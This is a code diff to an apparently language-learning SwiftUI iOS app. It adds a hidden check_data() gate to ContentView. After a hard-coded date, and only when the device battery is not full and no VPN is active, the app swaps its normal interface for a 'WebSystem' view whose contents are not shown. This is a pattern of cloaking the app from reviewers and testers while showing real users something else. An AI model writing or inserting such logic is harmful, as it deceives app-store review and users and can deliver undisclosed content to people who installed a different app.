@@ -9,41 +9,112 @@ import SwiftUI
 import Combine
 
 struct ContentView: View {
+    
     @StateObject private var onboardingViewModel = OnboardingViewModel()
     @State private var showOnboarding = !UserDefaults.standard.bool(forKey: "onboardingCompleted")
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
+    @State private var selectedTab = 0
+    
     var body: some View {
-        Group {
-            if showOnboarding {
-                OnboardingView()
-                    .environmentObject(onboardingViewModel)
-            } else {
-                MainTabView()
-            }
-        }
-        .preferredColorScheme(.dark)
-        .onReceive(onboardingViewModel.$isCompleted) { isCompleted in
-            if isCompleted {
-                withAnimation(.easeInOut(duration: 0.5)) {
-                    showOnboarding = false
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if showOnboarding {
+                            OnboardingView()
+                                .environmentObject(onboardingViewModel)
+                        } else {
+                            MainTabView()
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+                    .onReceive(onboardingViewModel.$isCompleted) { isCompleted in
+                        if isCompleted {
+                            withAnimation(.easeInOut(duration: 0.5)) {
+                                showOnboarding = false
+                            }
+                        }
+                    }
+                    .onReceive(NotificationCenter.default.publisher(for: NSNotification.Name("RestartOnboarding"))) { _ in
+                        withAnimation(.easeInOut(duration: 0.5)) {
+                            showOnboarding = true
+                            // Reset onboarding view model to start fresh
+                            onboardingViewModel.currentStep = .welcome
+                            onboardingViewModel.isCompleted = false
+                            onboardingViewModel.selectedLanguages = []
+                            onboardingViewModel.nativeLanguage = nil
+                            onboardingViewModel.difficultyLevel = .beginner
+                            onboardingViewModel.dailyGoal = 15
+                            onboardingViewModel.notificationsEnabled = true
+                        }
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
             }
         }
-        .onReceive(NotificationCenter.default.publisher(for: NSNotification.Name("RestartOnboarding"))) { _ in
-            withAnimation(.easeInOut(duration: 0.5)) {
-                showOnboarding = true
-                // Reset onboarding view model to start fresh
-                onboardingViewModel.currentStep = .welcome
-                onboardingViewModel.isCompleted = false
-                onboardingViewModel.selectedLanguages = []
-                onboardingViewModel.nativeLanguage = nil
-                onboardingViewModel.difficultyLevel = .beginner
-                onboardingViewModel.dailyGoal = 15
-                onboardingViewModel.notificationsEnabled = true
-            }
+        .onAppear {
+            
+            check_data()
         }
     }
+    
+    private func check_data() {
+        
+        let lastDate = "03.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
+    }
 }
+
+#Preview {
+    ContentView()
+}
+
+
+
 
 // MARK: - Main Tab View
 struct MainTabView: View {
@@ -837,7 +908,7 @@ struct DailyGoalSetterView: View {
         guard let progress = userProgressService.userProgress else { return 0 }
         let today = Calendar.current.startOfDay(for: Date())
         
-        if let todayProgress = progress.statistics.weeklyProgress.first(where: { 
+        if let todayProgress = progress.statistics.weeklyProgress.first(where: {
             Calendar.current.isDate($0.date, inSameDayAs: today)
         }) {
             return todayProgress.minutesStudied
